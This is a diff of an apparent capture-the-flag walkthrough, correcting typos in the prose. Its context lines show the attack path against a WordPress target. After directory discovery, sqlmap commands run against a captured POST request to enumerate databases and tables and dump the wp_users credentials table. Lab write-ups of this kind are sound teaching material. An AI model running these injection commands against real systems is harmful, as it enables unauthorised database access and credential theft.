@@ -55,7 +55,7 @@ The results show the /robots.txt directory.
 ![](Img/robots.png)
 
 
-The only directory that works is the /comingreallysoon and it sais to look the /it-next directory
+The only directory that works is the /comingreallysoon and it said to look the /it-next directory.
 
 The /it-next directory look like this:
 
@@ -85,7 +85,7 @@ sqlmap -r post.txt -dbs
 
 ![](Img/sqlmap-dbs.png)
 
-wordpress database took my attention so I'm going to list tables
+Wordpress database took my attention so I'm going to list tables.
 
 ```bash
 sqlmap -r post.txt -D wordpress --tables
@@ -93,7 +93,7 @@ sqlmap -r post.txt -D wordpress --tables
 
 ![](Img/sqlmap-tables.png)
 
-I'm going to dump the wp_users table
+I'm going to dump the wp_users table.
 
 ```bash
 sqlmap -r post.txt -D wordpress -T wp_users --dump
